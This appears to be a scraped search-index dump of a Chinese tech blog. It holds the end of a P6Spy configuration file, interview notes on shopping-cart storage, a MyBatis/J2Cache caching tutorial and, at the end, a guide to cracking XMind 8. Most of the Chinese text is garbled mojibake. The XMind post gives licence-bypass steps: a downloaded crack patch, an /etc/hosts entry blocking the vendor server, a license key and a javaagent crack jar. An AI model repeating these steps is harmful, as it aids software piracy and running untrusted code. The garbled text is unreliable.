specifies the appender to use for logging# Please note: reload means forgetting all the previously set# settings (even those set during runtime - via JMX)# and starting with the clean table# (only the properties read from the configuration file)# (default is com.p6spy.engine.spy.appender.FileLogger)#appender=com.p6spy.engine.spy.appender.Slf4JLoggerappender=com.p6spy.engine.spy.appender.StdoutLogger#appender=com.p6spy.engine.spy.appender.FileLogger# name of logfile to use, note Windows users should make sure to use forward slashes in their pathname (e:/test/spy.log)# (used for com.p6spy.engine.spy.appender.FileLogger only)# (default is spy.log)#logfile=/var/log/spy.log# append to the p6spy log file. if this is set to false the# log file is truncated every time. (file logger only)# (default is true)#append=true# class to use for formatting log messages (default is: com.p6spy.engine.spy.appender.SingleLineFormat)logMessageFormat=com.p6spy.engine.spy.appender.MultiLineFormat# Custom log message format used ONLY IF logMessageFormat is set to com.p6spy.engine.spy.appender.CustomLineFormat# default is %(currentTime)|%(executionTime)|%(category)|connection%(connectionId)|%(sqlSingleLine)# Available placeholders are:# %(connectionId) the id of the connection# %(currentTime) the current time expressing in milliseconds# %(executionTime) the time in milliseconds that the operation took to complete# %(category) the category of the operation# %(effectiveSql) the SQL statement as submitted to the driver# %(effectiveSqlSingleLine) the SQL statement as submitted to the driver, with all new lines removed# %(sql) the SQL statement with all bind variables replaced with actual values# %(sqlSingleLine) the SQL statement with all bind variables replaced with actual values, with all new lines removed#customLogMessageFormat=%(currentTime)|%(executionTime)|%(category)|connection%(connectionId)|%(sqlSingleLine)# format that is used for logging of the java.util.Date implementations (has to be compatible with java.text.SimpleDateFormat)# (default is yyyy-MM-dd\'T\'HH:mm:ss.SSSZ)#databaseDialectDateFormat=yyyy-MM-dd\'T\'HH:mm:ss.SSSZ# format that is used for logging of the java.sql.Timestamp implementations (has to be compatible with java.text.SimpleDateFormat)# (default is yyyy-MM-dd\'T\'HH:mm:ss.SSSZ)#databaseDialectTimestampFormat=yyyy-MM-dd\'T\'HH:mm:ss.SSSZ# format that is used for logging booleans, possible values: boolean, numeric# (default is boolean)#databaseDialectBooleanFormat=boolean# whether to expose options via JMX or not# (default is true)#jmx=true# if exposing options via jmx (see option: jmx), what should be the prefix used?# jmx naming pattern constructed is: com.p6spy(.&lt;jmxPrefix&gt;)?:name=&lt;optionsClassName&gt;# please note, if there is already such a name in use it would be unregistered first (the last registered wins)# (default is none)#jmxPrefix=# if set to true, the execution time will be measured in nanoseconds as opposed to milliseconds# (default is false)#useNanoTime=false################################################################## DataSource replacement ## ## Replace the real DataSource class in your application server ## configuration with the name com.p6spy.engine.spy.P6DataSource ## (that provides also connection pooling and xa support). ## then add the JNDI name and class name of the real ## DataSource here ## ## Values set in this item cannot be reloaded using the ## reloadproperties variable. Once it is loaded, it remains ## in memory until the application is restarted. ## ###################################################################realdatasource=/RealMySqlDS#realdatasourceclass=com.mysql.jdbc.jdbc2.optional.MysqlDataSource################################################################## DataSource properties ## ## If you are using the DataSource support to intercept calls ## to a DataSource that requires properties for proper setup, ## define those properties here. Use name value pairs, separate ## the name and value with a semicolon, and separate the ## pairs with commas. ## ## The example shown here is for mysql ## ###################################################################realdatasourceproperties=port;3306,serverName;myhost,databaseName;jbossdb,foo;bar################################################################## JNDI DataSource lookup ## ## If you are using the DataSource support outside of an app ## server, you will probably need to define the JNDI Context ## environment. ## ## If the P6Spy code will be executing inside an app server then ## do not use these properties, and the DataSource lookup will ## use the naming context defined by the app server. ## ## The two standard elements of the naming environment are ## jndicontextfactory and jndicontextproviderurl. If you need ## additional elements, use the jndicontextcustom property. ## You can define multiple properties in jndicontextcustom, ## in name value pairs. Separate the name and value with a ## semicolon, and separate the pairs with commas. ## ## The example shown here is for a standalone program running on ## a machine that is also running JBoss, so the JNDI context ## is configured for JBoss (3.0.4). ## ## (by default all these are empty) ###################################################################jndicontextfactory=org.jnp.interfaces.NamingContextFactory#jndicontextproviderurl=localhost:1099#jndicontextcustom=java.naming.factory.url.pkgs;org.jboss.naming:org.jnp.interfaces#jndicontextfactory=com.ibm.websphere.naming.WsnInitialContextFactory#jndicontextproviderurl=iiop://localhost:900################################################################# P6 LOGGING SPECIFIC PROPERTIES ################################################################## filter what is logged# please note this is a precondition for usage of: include/exclude/sqlexpression# (default is false)#filter=false# comma separated list of strings to include# please note that special characters escaping (used in java) has to be done for the provided regular expression# (default is empty)#include=# comma separated list of strings to exclude# (default is empty)#exclude=# sql expression to evaluate if using regex# please note that special characters escaping (used in java) has to be done for the provided regular expression# (default is empty)#sqlexpression=#list of categories to exclude: error, info, batch, debug, statement,#commit, rollback, result and resultset are valid values# (default is info,debug,result,resultset,batch)#excludecategories=info,debug,result,resultset,batch#whether the binary values (passed to DB or retrieved ones) should be logged with placeholder: [binary] or not.# (default is false)#excludebinary=false# Execution threshold applies to the standard logging of P6Spy.# While the standard logging logs out every statement# regardless of its execution time, this feature puts a time# condition on that logging. Only statements that have taken# longer than the time specified (in milliseconds) will be# logged. This way it is possible to see only statements that# have exceeded some high water mark.# This time is reloadable.## executionThreshold=integer time (milliseconds)# (default is 0)#executionThreshold=################################################################# P6 OUTAGE SPECIFIC PROPERTIES ################################################################## Outage Detection## This feature detects long-running statements that may be indicative of# a database outage problem. If this feature is turned on, it will log any# statement that surpasses the configurable time boundary during its execution.# When this feature is enabled, no other statements are logged except the long# running statements. The interval property is the boundary time set in seconds.# For example, if this is set to 2, then any statement requiring at least 2# seconds will be logged. Note that the same statement will continue to be logged# for as long as it executes. So if the interval is set to 2, and the query takes# 11 seconds, it will be logged 5 times (at the 2, 4, 6, 8, 10 second intervals).## outagedetection=true|false# outagedetectioninterval=integer time (seconds)## (default is false)#outagedetection=false# (default is 60)#outagedetectioninterval=30 P6Spy ç›¸å…³ç«™ç‚¹ P6Spy Github P6Spy Installation P6Spy Configuration and Usage var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java"},{title:"åˆ†å¸ƒå¼æŠ€æœ¯é¢è¯•é¢˜ä¹‹ä¸€",url:"/posts/c61757ff.html",text:'å•ç‚¹ç™»å½•æµç¨‹ è´­ç‰©è½¦å®ç°æµç¨‹è´­ç‰©è½¦ä¸ç”¨æˆ·çš„å…³ç³»ï¼š ä¸€ä¸ªç”¨æˆ·å¿…é¡»å¯¹åº”ä¸€ä¸ªè´­ç‰©è½¦ï¼ˆç”¨æˆ·ä¸ç®¡è´­ä¹°å¤šå°‘å•†å“ï¼Œéƒ½ä¼šå­˜æ”¾åœ¨å±äºè‡ªå·±çš„è´­ç‰©è½¦ä¸­ï¼‰ è´­ç‰©è½¦ç›¸å…³çš„æ“ä½œæœ‰å“ªäº›ï¼š æ·»åŠ è´­ç‰©è½¦ ç”¨æˆ·æœªç™»å½•çŠ¶æ€ è´­ç‰©è½¦æ•°æ®æ·»åŠ åˆ°ä»€ä¹ˆåœ°æ–¹ï¼Ÿ 1ï¼‰Reids 2ï¼‰Cookieï¼Œè‹¥æµè§ˆå™¨ç¦ç”¨äº† Cookieï¼Œå¯ä»¥å­˜å‚¨åœ¨æµè§ˆå™¨çš„ Local Storage ç”¨æˆ·å·²ç™»å½•çŠ¶æ€ è´­ç‰©è½¦æ•°æ®æ·»åŠ åˆ°ä»€ä¹ˆåœ°æ–¹ï¼Ÿ 1ï¼‰Reids 2ï¼‰æ•°æ®åº“ 3ï¼‰Redis + æ•°æ®åº“ å±•ç¤ºè´­ç‰©è½¦ ç”¨æˆ·æœªç™»å½•çŠ¶æ€ ç›´æ¥ä» Redis æˆ–è€… Cookie ä¸­å–å¾—æ•°æ®æ¥å±•ç¤º ç”¨æˆ·å·²ç™»å½•çŠ¶æ€ å¿…é¡»æ˜¾ç¤ºæ•°æ®åº“ + Redis + Cookie ä¸­çš„å…¨éƒ¨è´­ç‰©è½¦æ•°æ® Redis ä¸­ä½¿ç”¨çš„æ•°æ®ç±»å‹ä¸ºæ•£åˆ—ï¼ˆHashï¼‰ï¼ŒKEY ä¸º user:userId:cartï¼Œé€šè¿‡ Hset(key, productId, value) æ¥æ·»åŠ ç”¨æˆ·çš„è´­ç‰©è½¦æ•°æ®ã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ä¼ä¸šé¢è¯•"},{title:"MyBatis ä½¿ç”¨ J2Cache ä½œä¸ºäºŒçº§ç¼“å­˜å®ç°",url:"/posts/ee90f3ef.html",text:'J2Cache çš„ Gradle é…ç½®é¡¹ç›®ä¸­å¼•å…¥ä»¥ä¸‹ä¾èµ–åï¼Œéœ€è¦æ ¹æ®é¡¹ç›®å…·ä½“çš„è¿è¡ŒçŠ¶å†µè°ƒæ•´ Gradle çš„ä¾èµ–é…ç½®ï¼Œä»¥ä¸‹é…ç½®ä½¿ç”¨åˆ° SpringBootã€‚ 123compile \'net.oschina.j2cache:j2cache-core:2.7.6-release\'compile \'net.oschina.j2cache:j2cache-mybatis:2.7.0-release\'compile \'net.oschina.j2cache:j2cache-spring-boot2-starter:2.7.6-release\' MyBatis çš„ Mapper ä½¿ç”¨ J2Cacheé¦–å…ˆåœ¨ MyBatis çš„å…¨å±€é…ç½®ä¸­å¼€å¯äºŒçº§ç¼“å­˜ï¼Œç„¶åæ ¹æ®ä¸‹é¢çš„ä¸¤ç§æƒ…å†µè¿›è¡Œé…ç½®ï¼ˆäºŒé€‰ä¸€ï¼‰ 1234&lt;settings&gt; &lt;!-- å¼€å¯äºŒçº§ç¼“å­˜ï¼Œé»˜è®¤true --&gt; &lt;setting name="cacheEnabled" value="true"/&gt;&lt;/settings&gt; ç¬¬ä¸€ç§ä½¿ç”¨æƒ…å†µï¼šå¯¹å½“å‰ namespace å†…çš„æ‰€æœ‰ sql å¯ç”¨äºŒçº§ç¼“å­˜ 1234&lt;mapper namespace="com.example.dao.user.UserApiMapper"&gt; &lt;!-- æŒ‡å®šMyBatisçš„äºŒçº§ç¼“å­˜å®ç°ç±» --&gt; &lt;cache type="net.oschina.j2cache.mybatis.J2CacheAdapter"/&gt;&lt;/mapper&gt; æˆ–è€…ä½¿ç”¨ Java æ³¨è§£è¿›è¡Œé…ç½®ï¼Œæ­¤å†™æ³•ä¼šå¯¼è‡´ XML æ˜ å°„æ–‡ä»¶ä¸­çš„å…¶ä»– SQL æ— æ³•ä½¿ç”¨äºŒçº§ç¼“å­˜ï¼Œä¸‹é¢ä¼šè¯¦ç»†ä»‹ç» 1234@CacheNamespace(implementation = J2CacheAdapter.class)public interface UserApiMapper extends BaseMapper&lt;UserApi&gt; {} ç¬¬äºŒç§ä½¿ç”¨æƒ…å†µï¼šå¯¹å½“å‰ namespace å†…æŒ‡å®šçš„ sql è®¾ç½®æ˜¯å¦å¯ç”¨äºŒçº§ç¼“å­˜ 12345678910&lt;mapper namespace="com.example.dao.user.UserApiMapper"&gt; &lt;!-- æŒ‡å®šMyBatisçš„äºŒçº§ç¼“å­˜å®ç°ç±» --&gt; &lt;cache type="net.oschina.j2cache.mybatis.J2CacheAdapter"/&gt; &lt;!-- é€šè¿‡é…ç½®useCacheå±æ€§ï¼ŒæŒ‡å®šå½“å‰sqlæ˜¯å¦å¯ç”¨äºŒçº§ç¼“å­˜ï¼Œé»˜è®¤ä¸ºtrueï¼Œå¦‚æœè®¾ç½®ä¸ºfalseï¼Œåˆ™æ¯æ¬¡éƒ½ä¼šå‘sqlå»æ•°æ®åº“æŸ¥è¯¢ --&gt; &lt;select id="selectRecord" resultMap="userApiMap" useCache="false"&gt; select * from man_user_api where userid = #{userId} and exchange_id = #{exchangeId} &lt;/select&gt;&lt;/mapper&gt; æˆ–è€…ä½¿ç”¨ Java æ³¨è§£è¿›è¡Œé…ç½®ï¼Œæ­¤å†™æ³•ä¼šå¯¼è‡´ XML æ˜ å°„æ–‡ä»¶ä¸­çš„å…¶ä»– SQL æ— æ³•ä½¿ç”¨äºŒçº§ç¼“å­˜ï¼Œä¸‹é¢ä¼šè¯¦ç»†ä»‹ç» 12345678@CacheNamespace(implementation = J2CacheAdapter.class)public interface UserApiMapper extends BaseMapper&lt;UserApi&gt; { @Options(useCache = false) @Select("select * from man_user_api where userid = #{userId} and exchange_id = #{exchangeId}") public UserApi selectRecord(@Param(("userId")) long userId, @Param("exchangeId") long exchangeId);} äºŒçº§ç¼“å­˜çš„å‘MyBatis-Plus äºŒçº§ç¼“å­˜ä¸ç”Ÿæ•ˆå®˜æ–¹æ¨èçš„æ–¹å¼æ˜¯ç»Ÿä¸€åœ¨ XML æ˜ å°„æ–‡ä»¶ä¸­é…ç½®ç¼“å­˜ä¸ SQLï¼Œæ­¤æ–¹å¼åœ¨ MyBatis + MyBatis-Plusï¼ˆversion &lt;= 2.0.9ï¼‰çš„ç¯å¢ƒä¸‹å¯ä»¥æ­£å¸¸å·¥ä½œã€‚ä½†æ˜¯å½“ä½¿ç”¨ç‰ˆæœ¬å·å¤§äº 2.0.9 çš„ MyBatis-Plusï¼Œä½¿ç”¨ XML é…ç½®ç¼“å­˜çš„æ–¹å¼ä¼šå¯¼è‡´ MyBatis-Plus çš„äºŒçº§ç¼“å­˜ä¸ç”Ÿæ•ˆï¼Œå…·ä½“è¡¨ç°ä¸ºå‘å‡ºçš„ SQLï¼ˆç”± MyBatis-Plus è‡ªåŠ¨ç”Ÿæˆçš„ SQLï¼‰ä¸èƒ½æ­£å¸¸ä½¿ç”¨äºŒçº§ç¼“å­˜ã€‚æ ¹æ® MyBatis-Plus å®˜æ–¹æ–‡æ¡£çš„è¯´æ˜ï¼Œå½“ä½¿ç”¨ 2.0.9 ä»¥ä¸Šçš„ç‰ˆæœ¬ï¼Œéœ€è¦åœ¨ä»£ç ä¸­ MyBatis çš„ Mapper å±‚æ·»åŠ ç¼“å­˜æ³¨é‡Šï¼Œå£°æ˜ implementation çš„å€¼ä¸º cache æ¥å£çš„å®ç°ç±»ï¼Œæ­¤æ—¶ XML æ˜ å°„æ–‡ä»¶ä¸­ä¸èƒ½å†å£°æ˜ cache æ ‡ç­¾ï¼Œä»£ç å¦‚ä¸‹ï¼š 1234@CacheNamespace(implementation = J2CacheAdapter.class)public interface UserApiMapper extends BaseMapper&lt;UserApi&gt; {} MyBatis äºŒçº§ç¼“å­˜ä¸ç”Ÿæ•ˆä½¿ç”¨ @CacheNamespace æ³¨è§£åï¼ŒMyBatis-Plus çš„äºŒçº§ç¼“å­˜ç¡®å®æ˜¯ç”Ÿæ•ˆäº†ï¼Œä½†åœ¨ XML æ˜ å°„æ–‡ä»¶ä¸­çš„å…¶ä»– SQL æ­¤æ—¶ä¸èƒ½æ­£å¸¸ä½¿ç”¨äºŒçº§ç¼“å­˜ï¼Œè€Œåœ¨ Mapper å±‚é€šè¿‡æ³¨è§£å£°æ˜çš„ SQL åˆ™ä¸å—å½±å“ã€‚ äºŒçº§ç¼“å­˜é…ç½®æ€»ç»“ä¸ç®¡é€šè¿‡æ³¨è§£è¿˜æ˜¯ XML çš„æ–¹å¼é…ç½®ç¼“å­˜ï¼Œæ€»ç»“å¤§æ¦‚æœ‰ä»¥ä¸‹å‡ ç§ä½¿ç”¨æƒ…å†µã€‚å®é™…å¼€å‘ä¸­å¯ä»¥æ ¹æ®ä¸åŒçš„ä¸šåŠ¡éœ€æ±‚æ··åˆä½¿ç”¨ä¸åŒçš„é…ç½®æ–¹å¼ï¼Œç¬¬ä¸€ç§æ–¹å¼é€‚åˆ SQL æ¯”è¾ƒå¤æ‚çš„ä¸šåŠ¡åœºæ™¯ï¼Œç¬¬ä¸‰ç§æ–¹å¼é€‚åˆ SQL æ¯”è¾ƒç®€å•çš„ä¸šåŠ¡åœºæ™¯ï¼Œæ¨èç¬¬ä¸€ç§æ–¹å¼ã€‚ ç¬¬ä¸€ç§ï¼šMyBatis å•ç‹¬æ­£å¸¸ä½¿ç”¨äºŒçº§ç¼“å­˜ï¼Œå°†æ‰€æœ‰ SQLã€ç¼“å­˜é…ç½®éƒ½å†™åœ¨ XML æ˜ å°„æ–‡ä»¶ä¸­ï¼Œæ­¤æ—¶ MyBatis-Plus çš„äºŒçº§ç¼“å­˜å¤±æ•ˆï¼› ç¬¬äºŒç§ï¼šMyBatis-Plus æ­£å¸¸ä½¿ç”¨äºŒçº§ç¼“å­˜ï¼Œåœ¨ Mapper å±‚å£°æ˜æ³¨è§£ @CacheNamespaceï¼Œæ­¤æ—¶ MyBatis çš„äºŒçº§ç¼“å­˜å¤±æ•ˆï¼ˆé’ˆå¯¹ XML ä¸­å®šä¹‰çš„ SQLï¼‰ï¼Œè€Œ MyBatis é€šè¿‡ Java æ³¨è§£å®šä¹‰çš„ SQL åˆ™ä¾ç„¶ä¼šç”Ÿæ•ˆï¼› ç¬¬ä¸‰ç§ï¼šMyBatis ä¸ MyBatis-Plus åŒæ—¶æ­£å¸¸ä½¿ç”¨äºŒçº§ç¼“å­˜ï¼Œå°†æ‰€æœ‰ SQLã€ç¼“å­˜é…ç½®é€šè¿‡æ³¨è§£çš„æ–¹å¼å®šä¹‰åœ¨ Mapper å±‚ï¼›æ­¤æ—¶ XML æ˜ å°„æ–‡ä»¶ä¸­ä¸èƒ½å†å®šä¹‰ SQLï¼Œå¦åˆ™ XML ä¸­çš„ SQL æ— æ³•ä½¿ç”¨äºŒçº§ç¼“å­˜ã€‚ æŒ‡å®š J2Cache çš„ç¼“å­˜å¤§å°ä¸æœ‰æ•ˆæ—¶é—´å½“ J2Cache ä½œä¸º MyBatis çš„äºŒçº§ç¼“å­˜å®ç°ï¼ŒJ2Cache å®˜æ–¹æ”¯æŒåœ¨é…ç½®æ–‡ä»¶ä¸­æŒ‡å®šç¼“å­˜çš„å¤§å°ä¸æœ‰æ•ˆæ—¶é—´ï¼Œå…·ä½“é…ç½®å¦‚ä¸‹ï¼š 12345678910# redis storage mode (generic|hash)lettuce.storage = generic# Enable/Disable ttl in redis cache data (if disabled, the object in redis will never expire, default:true)# NOTICE: redis hash mode (redis.storage = hash) do not support this feature)j2cache.sync_ttl_to_redis = true# ttl for one level cache# [name] = size, xxxx[s|m|h|d]caffeine.region.default = 1000, 30m é‡ç‚¹å…³æ³¨çš„é…ç½®æ˜¯ â€œcaffeine.region.defaultâ€ï¼Œä¸Šé¢é…ç½®äº†é»˜è®¤ Regionï¼ˆåŒºåŸŸï¼‰çš„ä¸€çº§ç¼“å­˜å¤§å°ä¸º 1000ï¼Œæœ‰æ•ˆæ—¶é—´ä¸º 30 åˆ†é’Ÿã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœéœ€è¦ä¸º UserAPI è¡¨çš„è®°å½•å•ç‹¬è®¾ç½®ç¼“å­˜å¤§å°å’Œæœ‰æ•ˆæ—¶é—´ï¼Œå¯ä»¥å‚è€ƒä»¥ä¸‹é…ç½®ï¼›å…¶ä¸­ Region æ˜¯ Mapper çš„ç±»å…¨åï¼Œå¤§å°ä¸º 2000ï¼Œæœ‰æ•ˆæ—¶é—´ä¸º 12 å°æ—¶ã€‚å½“ J2Cache æ‰¾ä¸åˆ°å¯¹åº”çš„ Regionï¼Œé»˜è®¤ä¼šé‡‡ç”¨ â€œcaffeine.region.defaultâ€ çš„é…ç½®ç­–ç•¥ã€‚ 1caffeine.region.com.example.dao.user.UserApiMapper = 2000, 12h åŸºäº SpringBoot çš„å•å…ƒæµ‹è¯•ç±»å½“ MyBatis çš„ Mapper ä½¿ç”¨ J2Cache ä½œä¸ºäºŒçº§ç¼“å­˜çš„å®ç°ï¼Œé‚£ä¹ˆå•å…ƒæµ‹è¯•ç±»ä¸­æš‚æ—¶éœ€è¦æŒ‡å®š J2Cache çš„ç›¸å…³é…ç½®ï¼Œå¦åˆ™æµ‹è¯•ç±»æ— æ³•æ­£å¸¸å¯åŠ¨ã€‚å¦‚æœæ¯ä¸ªæµ‹è¯•ç±»éƒ½è¦åŠ ä¸Šä¸€å † J2Cache çš„é…ç½®å†…å®¹ï¼Œå®åœ¨æ˜¯ä¸æ–¹ä¾¿ï¼Œè€Œä¸” J2Cache çš„é…ç½®ä¸€æ—¦æ›´æ”¹ï¼Œåˆ™éœ€è¦ä¿®æ”¹æ¯ä¸ªæµ‹è¯•ç±»çš„ä»£ç ã€‚ä¸ºäº†è§£å†³è¿™ç§æƒ…å†µï¼Œå¯ä»¥åœ¨æ¨¡å—ä¸‹åˆ›å»º BaseSpringBootTest åŸºç¡€æµ‹è¯•ç±»ï¼Œç„¶åå…¶ä»–æµ‹è¯•ç±»ç›´æ¥ç»§æ‰¿åŸºç¡€æµ‹è¯•ç±»å³å¯ã€‚ 123456789101112131415161718192021222324252627282930313233/** * åŸºç¡€æµ‹è¯•ç±» */@RunWith(SpringRunner.class)@SpringBootTest(properties = { "j2cache.l2-cache-open=true", "j2cache.open-spring-cache=true", "j2cache.allow-null-values=true", "spring.cache.type=GENERIC", "j2cache.cache-clean-mode=passive", "j2cache.config-location=classpath:j2cache.properties"})public class BaseSpringBootTest { protected Logger logger = LoggerFactory.getLogger(BaseSpringBootTest.class);}/** * å…·ä½“çš„æµ‹è¯•ç±»å®ç° */public class J2CacheMyBatisTest extends BaseSpringBootTest { @Autowired private UserApiMapper apiMapper; private Logger logger = LoggerFactory.getLogger(J2CacheMyBatisTest.class); @Test public void util() { UserApi api = apiMapper.selectById(1L); logger.info("===&gt; " + api); }} J2Cache çš„é…ç½®æ–‡ä»¶J2Cache æ”¯æŒä½¿ç”¨ Redis æˆ–è€… RabbitMQ çš„ Pub/Sub æœåŠ¡ï¼Œæ”¯æŒä½¿ç”¨ Ehcacheã€Caffeine ä½œä¸ºä¸€çº§ç¼“å­˜ï¼Œæ”¯æŒä½¿ç”¨ Jedisã€Lettuce ä½œä¸º Redis çš„å®¢æˆ·ç«¯ã€‚ç›®å‰ J2Cache æœ€ä¸»è¦çš„é…ç½®å†…å®¹åªèƒ½å†™åœ¨ j2cache.properties æ–‡ä»¶ä¸­ï¼Œå¦‚æœå°†é…ç½®å†…å®¹å…¨éƒ¨ç§»åŠ¨åˆ° SpringBoot çš„ xxx.yml æ–‡ä»¶ä¸­ï¼ŒSpringBoot åº”ç”¨çš„å¯åŠ¨ä¸å•å…ƒæµ‹è¯•éƒ½ä¼šå‡ºé”™ï¼Œè¿™ä¸ J2Cache çš„æºç æœ‰å…³ã€‚ ä¸´æ—¶å…³é—­ MyBatis ä½¿ç”¨ J2Cacheåœ¨ MyBatis çš„å…¨å±€é…ç½®ä¸­ï¼Œå…³é—­äºŒçº§ç¼“å­˜å³å¯ã€‚ 1234&lt;settings&gt; &lt;!-- å…³é—­äºŒçº§ç¼“å­˜ï¼Œé»˜è®¤true --&gt; &lt;setting name="cacheEnabled" value="false"/&gt;&lt;/settings&gt; var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java ç¼“å­˜"},{title:"Linux ç ´è§£å®‰è£… XMind8",url:"/posts/d32cbc24.html",text:'ç›¸å…³ç«™ç‚¹ XMind 8 å®˜ç½‘ä¸‹è½½ï¼šXMind 8 XMind 8 ç ´è§£è¡¥ä¸ä¸‹è½½ï¼ˆæœ¬ç«™ï¼‰ï¼š XMind_amd64.tar.gz XMind 8 ç ´è§£è¡¥ä¸ä¸‹è½½ï¼ˆç™¾åº¦ç½‘ç›˜ï¼‰ï¼š ç½‘ç›˜åœ°å€ æå–ç ï¼štnkb å®‰è£… JDK 8 ç”±äº XMind 8 çš„ Linux ç‰ˆæ˜¯åŸºäº Eclipse å¼€å‘çš„ï¼Œå› æ­¤éœ€è¦æ‰‹åŠ¨å®‰è£… JDK 8ï¼Œå»ºè®®å°† JDK 8 çš„å®‰è£…è·¯å¾„æ·»åŠ åˆ°ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡ä¸­ï¼Œè¿™é‡Œä¸å†ç´¯è¿°ã€‚ç‰¹åˆ«æ³¨æ„ï¼Œè¿™é‡Œå®‰è£…çš„ JDK ç‰ˆæœ¬å¿…é¡»ä¸º 8ï¼Œå¦åˆ™ä¼šå¼•èµ· XMind 8 å¯åŠ¨å¤±è´¥ç­‰é—®é¢˜ï¼›å¦‚æœç³»ç»Ÿä¸­å­˜åœ¨å¤šä¸ª JDK ç‰ˆæœ¬ï¼Œå¯å‚è€ƒæ–‡ç« æœ«å°¾ç»™å‡ºçš„è§£å†³æ–¹æ¡ˆï¼Œæ‰‹åŠ¨æŒ‡å®š JDK çš„å®‰è£…è·¯å¾„ã€‚ XMind 8 ç ´è§£å®‰è£… 12345678910111213141516171819202122232425# åˆ›å»ºå®‰è£…ç›®å½•# mkdir -p /usr/local/xmind-8# è§£å‹XMindçš„å®‰è£…æ–‡ä»¶# unzip -d /usr/local/xmind-8 xmind-8-update8-linux.zip# æ‹·è´ç ´è§£è¡¥ä¸æ–‡ä»¶åˆ°XMind_amd64ç›®å½•# cp XMind_amd64.tar.gz /usr/local/xmind-8/XMind_amd64# è§£å‹ç ´è§£è¡¥ä¸æ–‡ä»¶# cd /usr/local/xmind-8/XMind_amd64# tar -xvf XMind_amd64.tar.gz# rm -f XMind_amd64.tar.gz# å¦‚æœç³»ç»Ÿç¯å¢ƒæ˜¯Centosï¼Œåˆ™éœ€è¦ä¿®æ”¹å®‰è£…è„šæœ¬ï¼Œå°†è„šæœ¬é‡Œè‡ªåŠ¨å®‰è£…è½¯ä»¶çš„å‘½ä»¤æ³¨é‡Šæ‰ï¼Œé»˜è®¤çš„è„šæœ¬åªé€‚åˆDebian/Ubuntuç³»ç»Ÿ# vim /usr/local/xmind-8/setup.sh## apt-get install openjdk-8-jre libgtk2.0-0 libwebkitgtk-1.0-0 lame libc6 libglib2.0-0 # Centosç¯å¢ƒä¸‹ï¼Œæ³¨é‡Šè¿™è¡Œå†…å®¹# æ‰§è¡Œå®‰è£…è„šæœ¬# cd /usr/local/xmind-8# ./setup.sh# ä¿®æ”¹Hosts# vim /etc/hosts127.0.0.1 www.xmind.net è¿è¡Œå¹¶æ¿€æ´» XMind 8 è¿›å…¥ XMind_amd64 ç›®å½•ï¼Œæ‰§è¡Œå‘½ä»¤ ./XMind å¯åŠ¨ XMindï¼Œç„¶ååœ¨ XMind çš„ä¸»ç•Œé¢å¯¼èˆªåˆ°ï¼šHelp -&gt; Licenseï¼Œå¤åˆ¶ä»¥ä¸‹ License Key è¿›è¡Œæ¿€æ´»å³å¯ï¼ŒXMind 8 ç•Œé¢ä¸Šçš„é‚®ç®±åœ°å€å¯ä»¥éšä¾¿å¡«ã€‚ 1XAka34A2rVRYJ4XBIU35UZMUEEF64CMMIYZCK2FZZUQNODEKUHGJLFMSLIQMQUCUBXRENLK6NZL37JXP4PZXQFILMQ2RG5R7G4QNDO3PSOEUBOCDRYSSXZGRARV6MGA33TN2AMUBHEL4FXMWYTTJDEINJXUAV4BAYKBDCZQWVF3LWYXSDCXY546U3NBGOI3ZPAP2SO3CSQFNB7VVIY123456789012345 æ¿€æ´»æˆåŠŸçš„æˆªå›¾ XMind çš„ Linux ç‰ˆæ˜¯åŸºäº Eclipse å¼€å‘çš„ï¼Œä»¥ä¸Šç ´è§£å®‰è£…æ–¹æ³•é€‚ç”¨äº Windowsã€Macã€Linux ç³»ç»Ÿï¼Œå…¶ä¸­è¢«æ›¿æ¢çš„ XMind.ini æ–‡ä»¶ä¹Ÿåªæ˜¯åœ¨åŸå§‹æ–‡ä»¶æœ«å°¾æ·»åŠ äº†ä¸€è¡Œå†…å®¹ -javaagent:./XMindCrack.jar æ¥æ‰§è¡Œ Crack æ–‡ä»¶ã€‚ è§£å†³ XMind 8 ç”±äºæ‰¾ä¸åˆ°æœ¬åœ°å®‰è£…çš„ JDK è€Œå¯¼è‡´å¯åŠ¨å¤±è´¥çš„é—®é¢˜ ç¼–è¾‘ /usr/local/xmind-8/XMind_amd64/XMind.ini é…ç½®æ–‡ä»¶ï¼ˆ64 ä½ç³»ç»Ÿé€‰æ‹© AMD-64 çš„é…ç½®æ–‡ä»¶ï¼‰ï¼Œåœ¨ -vmargs çš„å‰é¢æ·»åŠ ä»¥ä¸‹å†…å®¹æ¥æŒ‡å®š JDK 